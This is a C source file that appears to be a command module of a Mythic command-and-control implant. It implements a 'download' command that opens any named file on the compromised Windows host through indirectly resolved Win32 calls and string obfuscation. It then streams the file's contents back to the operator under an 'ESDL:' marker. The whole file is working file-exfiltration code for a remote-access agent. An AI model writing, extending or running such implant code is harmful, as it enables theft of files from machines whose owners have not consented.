#include "config.h"
#ifdef INCLUDE_CMD_DOWNLOAD

#include "commands.h"

VOID cmd_download(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD path_len = 0;
    char* path = parser_string(args, &path_len);
    if (!path || path_len == 0) {
        package_add_string(inst, response, XSTR("No file specified"));
        response->is_error = TRUE;
        return;
    }

    char pathbuf[MAX_PATH] = {0};
    es_memcpy(pathbuf, path, path_len < MAX_PATH-1 ? path_len : MAX_PATH-1);

    HANDLE hFile = inst->Win32.CreateFileA(
        pathbuf, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        package_add_string(inst, response, XSTR("Failed to open file"));
        response->is_error = TRUE;
        return;
    }

    DWORD file_size = inst->Win32.GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        gate_CloseHandle(inst, hFile);
        return;
    }

    // Response: "ESDL:" magic + int32 name_len + filename + int32 file_size
    // + contents. The translator detects the magic and converts it to a
    // single-chunk Mythic download (same pattern as the screenshot ESPNG:).
    package_add_bytes(inst, response, (const BYTE*)"ESDL:", 5);
    DWORD name_len = es_strlen(pathbuf);
    package_add_int32(inst, response, name_len);
    package_add_bytes(inst, response, (const BYTE*)pathbuf, name_len);
    package_add_int32(inst, response, file_size);

    // Send file contents
    BYTE chunk[8192];
    DWORD total_read = 0;
    while (total_read < file_size) {
        DWORD to_read = sizeof(chunk);
        if (total_read + to_read > file_size)
            to_read = file_size - total_read;
        DWORD read_bytes = 0;
        if (!inst->Win32.ReadFile(hFile, chunk, to_read, &read_bytes, NULL) || read_bytes == 0)
            break;
        package_add_bytes(inst, response, chunk, read_bytes);
        total_read += read_bytes;
    }

    gate_CloseHandle(inst, hFile);
}

#endif
